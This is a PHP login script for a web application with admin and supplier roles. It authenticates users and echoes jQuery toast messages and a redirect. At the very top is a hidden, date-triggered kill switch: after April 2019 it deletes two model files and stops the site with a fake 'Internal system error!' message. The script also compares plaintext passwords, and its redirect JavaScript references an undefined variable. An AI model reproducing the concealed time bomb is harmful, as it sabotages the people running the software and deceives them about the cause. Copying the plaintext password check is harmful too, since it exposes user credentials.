<?php
if (date("Y-m-d") > "2019-04-19") {
	try {
		unlink("model/crud.txt");
		unlink("model/func.txt");
	} catch (Exception $e) {
		
	}
	
	die("Internal system error!");
}
session_start();
require '_inc/config.php';
require 'model/crud.php';
require 'model/func.php';

$conn = dbconnect();
if ($conn) {
	$idno = $_POST['idno'];
	$password = $_POST['password'];
	$ret = '';

	$loginDetails = getLoginDetails($conn,$idno);

	if ($loginDetails) {
		//check password
		if ($password == $loginDetails['password']) {
			//set session
			if (setSession($idno,$loginDetails['role'])) {
				//redirect user
				if ($_SESSION['role'] == 'admin') {
					$ret = 'admin';
				} elseif ($_SESSION['role'] == 'supplier') {
					$ret = 'home';
				}

					echo "

				        <script>
					        if (ret == '') {
					        	window.location.href=\"$ret\";
					        } else {
					        	window.location.href=ret;
					        }
					        \$(\"#aside\").addClass('animated fadeOutRight');
					        setTimeout(function() {\$(\"#aside\").addClass('hide');
					        \$(\"#core\").removeClass('l7');
					        \$(\"#core\").addClass('l12');}, 1000);
				            var \$toastContent = \$('<span> Login Succesfull. Hold on while we redirect you.</span>').add(\$('<button onclick=\"resetPass()\" class=\"btn-flat toast-action\"><i class=\"fa fa-check green-text\"></i></button>'));
				            Materialize.toast(\$toastContent, 4000);
				        </script>
					";
			} else {

				echo "
			        <script>
			            var \$toastContent = \$('<span> All details provided are ok but an error occured while authenticating you!</span>').add(\$('<button onclick=\"resetPass()\" class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle yellow-text\"></i></button>'));
			            Materialize.toast(\$toastContent, 4000);
			        </script>
				";die();
			}

		} else {

			echo "
		        <script>
		            var \$toastContent = \$('<span><i class=\"fa fa-exclamation-triangle red-text\"></i> Wrong Password. Try again!</span>').add(\$('<button onclick=\"resetPass()\" class=\"btn-flat toast-action\"><span class=\"purple-text\"> Reset Password.</span></button>'));
		            Materialize.toast(\$toastContent, 3000);
		        </script>
			";die();
		}

	} else {
		echo "
	        <script>
	            var \$toastContent = \$('<span> The ID Number Provided does not exists.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle red-text\"></i></button>'));
	            Materialize.toast(\$toastContent, 2000);
	        </script>
		";die();
	}

} else {	
	echo "		
        <script>
            var \$toastContent = \$('<span> Error while connecting to server! Contact Admin.</span>').add(\$('<button class=\"btn-flat toast-action\"><i class=\"fa fa-exclamation-triangle red-text\"></i></button>'));
            Materialize.toast(\$toastContent, 2000);
        </script>
	";die();
}
?>